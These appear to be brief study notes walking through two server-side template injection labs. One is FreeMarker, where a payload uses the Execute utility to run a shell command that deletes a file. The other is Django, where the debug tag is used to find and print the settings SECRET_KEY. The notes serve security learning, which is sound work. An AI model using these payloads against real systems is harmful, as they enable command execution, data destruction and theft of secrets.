## SSTI Vulnerabilities:
- ==Server-side template injection using documentation== 
  Causing an error like this in content editor box and previewing will reveal what template is used:
  
  of ${product.name} at ${alert()}.\</p>
  
  Failed at: ${alert()} [in template "freemarker" at lin...
  
  Remove the ${alert)} and replace it with:
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
- ==Server-side template injection with information disclosure via user-supplied objects== 
   Django framework is being used
   {% debug %} 
   Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
   {{settings.SECRET_KEY}}
   Save and view secret key.